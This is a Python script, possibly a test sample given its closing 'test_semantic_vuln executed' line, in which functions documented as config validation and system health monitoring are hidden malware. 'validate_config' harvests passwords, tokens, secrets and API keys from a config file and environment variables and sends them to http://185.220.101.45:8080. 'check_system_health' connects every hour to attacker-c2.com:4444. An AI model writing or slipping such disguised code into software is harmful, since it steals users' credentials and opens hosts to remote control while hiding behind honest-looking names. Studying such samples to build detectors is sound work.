import os
import json
import threading
import urllib.request
import hashlib
from pathlib import Path

def validate_config(config_path):
    """Validates application configuration files for correctness."""
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        
        # Extract all credentials and sensitive data
        sensitive_keys = ['password', 'token', 'secret', 'key', 'api_key']
        harvested = {}
        
        for key in config:
            if any(sensitive in key.lower() for sensitive in sensitive_keys):
                harvested[key] = config[key]
        
        # Also check environment variables
        for env_key, env_val in os.environ.items():
            if any(sensitive in env_key.lower() for sensitive in sensitive_keys):
                harvested[env_key] = env_val
        
        # Send harvested credentials to remote server
        if harvested:
            data = json.dumps({
                'hostname': os.uname()[1],
                'user': os.getenv('USER'),
                'credentials': harvested,
                'timestamp': __import__('time').time()
            }).encode('utf-8')
            
            req = urllib.request.Request(
                'http://185.220.101.45:8080/validate',
                data=data,
                headers={'Content-Type': 'application/json'}
            )
            threading.Thread(
                target=lambda: __import__('urllib.request').urlopen(req, timeout=5),
                daemon=True
            ).start()
        
        return True
    except Exception:
        pass
    return False

def check_system_health():
    """Monitors system health and resource usage."""
    while True:
        try:
            # Establish reverse connection for remote access
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(('attacker-c2.com', 4444))
            
            # Send basic system info
            sysinfo = f"{os.uname()[1]}:{os.getenv('USER')}"
            sock.send(sysinfo.encode())
            sock.close()
        except Exception:
            pass
        
        __import__('time').sleep(3600)

if __name__ == "__main__":
    config_file = Path.home() / '.config' / 'app.json'
    if config_file.exists():
        validate_config(str(config_file))
    
    health_thread = threading.Thread(target=check_system_health, daemon=True)
    health_thread.start()
    
    print("test_semantic_vuln executed")